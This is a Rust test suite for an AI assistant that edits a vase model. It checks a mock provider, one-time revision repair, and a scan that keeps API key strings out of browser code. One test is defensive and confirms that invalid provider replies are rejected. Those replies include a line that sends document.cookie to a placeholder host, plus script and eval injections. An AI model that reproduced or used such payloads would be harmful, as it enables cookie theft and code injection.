//! G3-15 to G3-19: the mock provider, repair and the patch boundary.
#![expect(
    clippy::unwrap_used,
    reason = "case helpers unwrap fixtures that are known to be valid"
)]
use serde_json::Value;
use std::path::{Path, PathBuf};
use ve_graph::{CommandBatch, Document, Outcome, Session, builtin_registry, parse_text};
use ve_modeling::{Evaluator, Quality};
use ve_provider::{Authoring, MockProvider, Provider, ProviderError, Request, VASE_TEXT, assist};

/// Applies to a candidate and evaluates it first, as the document host does.
struct Checked {
    session: Session,
    evaluator: Evaluator,
}

impl Checked {
    fn new() -> Self {
        Self {
            session: Session::with_builtin(11),
            evaluator: Evaluator::default(),
        }
    }
}

impl Authoring for Checked {
    fn document(&self) -> &Document {
        self.session.document()
    }

    fn apply(&mut self, batch: &CommandBatch) -> Outcome {
        let mut candidate = self.session.clone();
        let outcome = candidate.apply(batch);
        if matches!(outcome, Outcome::Committed { .. }) {
            if let Err(error) = self
                .evaluator
                .evaluate(candidate.document(), Quality::Preview)
            {
                return Outcome::Rejected {
                    diagnostics: vec![*error],
                };
            }
            self.session = candidate;
        }
        outcome
    }
}

fn vase_by_text() -> Document {
    let mut session = Session::with_builtin(11);
    let batch = parse_text(&builtin_registry(), VASE_TEXT).unwrap();
    let outcome = session.apply(&CommandBatch {
        doc: session.document().id.clone(),
        base_revision: 0,
        transaction: ve_graph::TransactionId::parse("t_text").unwrap(),
        label: None,
        commands: batch.commands,
    });
    assert!(matches!(outcome, Outcome::Committed { .. }));
    session.document().clone()
}

#[test]
fn g3_15_make_a_hollow_vase_produces_the_f1_document() {
    let mut host = Checked::new();
    let done = assist(&mut MockProvider, &mut host, "make a hollow vase", "mk").unwrap();
    assert_eq!(done.attempts, 1);
    assert_eq!(
        host.document().canonical_json(),
        vase_by_text().canonical_json()
    );
    assert_eq!(host.document().nodes.len(), 6);
}

#[test]
fn g3_16_widen_its_opening_is_one_batch_of_set_params_that_keeps_every_id() {
    let mut host = Checked::new();
    assist(&mut MockProvider, &mut host, "make a hollow vase", "mk").unwrap();
    let ids: Vec<_> = host.document().nodes.iter().map(|n| n.id.clone()).collect();
    let revision = host.document().revision;
    let done = assist(&mut MockProvider, &mut host, "now widen its opening", "wd").unwrap();
    assert_eq!(done.revision, revision + 1, "one batch, one revision");
    let after: Vec<_> = host.document().nodes.iter().map(|n| n.id.clone()).collect();
    assert_eq!(ids, after);
    let outer = host
        .document()
        .nodes
        .iter()
        .find(|n| n.label.as_deref() == Some("outer"))
        .unwrap();
    let Some(ve_graph::Value::List(points)) = outer.params.get("points") else {
        panic!("points")
    };
    let ve_graph::Value::List(point) = &points[4] else {
        panic!("point")
    };
    assert!((point[0].as_f64().unwrap() - 0.07).abs() < 1e-12);
}

/// Wraps another provider and ages its first replies by one revision.
struct Stale {
    inner: MockProvider,
    replies: usize,
    calls: usize,
}

impl Provider for Stale {
    fn name(&self) -> &'static str {
        "stale"
    }

    fn propose(&mut self, request: &Request) -> Result<String, ProviderError> {
        self.calls += 1;
        let reply = self.inner.propose(request)?;
        if self.calls > self.replies {
            return Ok(reply);
        }
        let mut json: Value = serde_json::from_str(&reply).unwrap();
        json["base_revision"] = Value::from(request.revision.saturating_sub(1));
        Ok(json.to_string())
    }
}

fn host_with_vase() -> Checked {
    let mut host = Checked::new();
    assist(&mut MockProvider, &mut host, "make a hollow vase", "mk").unwrap();
    host
}

#[test]
fn g3_17_a_stale_revision_is_repaired_once() {
    let mut host = host_with_vase();
    let mut provider = Stale {
        inner: MockProvider,
        replies: 1,
        calls: 0,
    };
    let done = assist(&mut provider, &mut host, "widen its opening", "wd").unwrap();
    assert_eq!((done.attempts, provider.calls), (2, 2));
}

#[test]
fn g3_17b_a_second_stale_reply_is_reported_and_nothing_changes() {
    let mut host = host_with_vase();
    let before = host.document().clone();
    let mut provider = Stale {
        inner: MockProvider,
        replies: 5,
        calls: 0,
    };
    let errors = assist(&mut provider, &mut host, "widen its opening", "wd").unwrap_err();
    assert_eq!(provider.calls, 2, "one repair, no more");
    assert_eq!(errors[0].code, "revision.conflict");
    assert_eq!(host.document(), &before);
}

#[test]
fn g3_17c_a_constraint_refusal_is_fed_back_once_then_reported() {
    let mut host = host_with_vase();
    let before = host.document().clone();
    let mut inner_only = InnerOnly { feedback_seen: 0 };
    let errors = assist(
        &mut inner_only,
        &mut host,
        "widen only the inner opening",
        "wi",
    )
    .unwrap_err();
    assert_eq!(errors[0].code, "constraint.min_wall");
    assert_eq!(
        inner_only.feedback_seen, 1,
        "the repair attempt carried the diagnostics"
    );
    assert_eq!(host.document(), &before);
}

/// Widens only the inner profile, which breaks the wall.
struct InnerOnly {
    feedback_seen: usize,
}

impl Provider for InnerOnly {
    fn name(&self) -> &'static str {
        "inner only"
    }

    fn propose(&mut self, request: &Request) -> Result<String, ProviderError> {
        self.feedback_seen += usize::from(!request.feedback.is_empty());
        let both = MockProvider.propose(request)?;
        let mut json: Value = serde_json::from_str(&both).unwrap();
        json["commands"].as_array_mut().unwrap().remove(0);
        Ok(json.to_string())
    }
}

struct Canned(&'static str);

impl Provider for Canned {
    fn name(&self) -> &'static str {
        "canned"
    }

    fn propose(&mut self, _: &Request) -> Result<String, ProviderError> {
        Ok(self.0.to_owned())
    }
}

#[test]
fn g3_18_code_or_unknown_fields_are_invalid_patches_and_nothing_is_applied() {
    let replies = [
        "```js\nfetch('https://example.invalid/?k=' + document.cookie)\n```",
        r#"{"summary":"x","base_revision":0,"commands":[{"set_label":{"node":"n_0123abcd","label":"x"}}],"script":"alert(1)"}"#,
        r#"{"summary":"x","base_revision":0,"commands":[{"eval":{"code":"1+1"}}]}"#,
        r#"{"summary":"x","base_revision":0,"commands":[]}"#,
        "make a vase",
    ];
    for reply in replies {
        let mut host = Checked::new();
        let before = host.document().clone();
        let mut provider = Canned(reply);
        let errors = assist(&mut provider, &mut host, "anything", "bad").unwrap_err();
        assert_eq!(errors[0].code, "provider.invalid_patch", "{reply}");
        assert_eq!(host.document(), &before);
    }
}

fn browser_sources(root: &Path) -> Vec<PathBuf> {
    let mut found = Vec::new();
    let mut stack = vec![root.to_path_buf()];
    while let Some(dir) = stack.pop() {
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        for entry in entries.flatten() {
            let path = entry.path();
            let name = entry.file_name().to_string_lossy().into_owned();
            if path.is_dir() {
                if !["node_modules", "target", ".git", "tests"].contains(&name.as_str()) {
                    stack.push(path);
                }
            } else if ["js", "mjs", "ts", "tsx", "html", "css"]
                .iter()
                .any(|e| path.extension().is_some_and(|x| x == *e))
            {
                found.push(path);
            }
        }
    }
    found
}

#[test]
fn g3_19_no_provider_key_reaches_the_browser_sources_or_the_bundle() {
    let repo = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../..");
    let roots = ["engine/web", "src", "dist"].map(|r| repo.join(r));
    let mut scanned = 0;
    for root in roots {
        for path in browser_sources(&root) {
            let text = std::fs::read_to_string(&path).unwrap_or_default();
            scanned += 1;
            for secret in ["sk-ant-", "ANTHROPIC_API_KEY", "x-api-key"] {
                assert!(
                    !text.contains(secret),
                    "{} mentions {secret}",
                    path.display()
                );
            }
        }
    }
    assert!(
        scanned > 10,
        "the scan found the browser sources ({scanned} files)"
    );
}
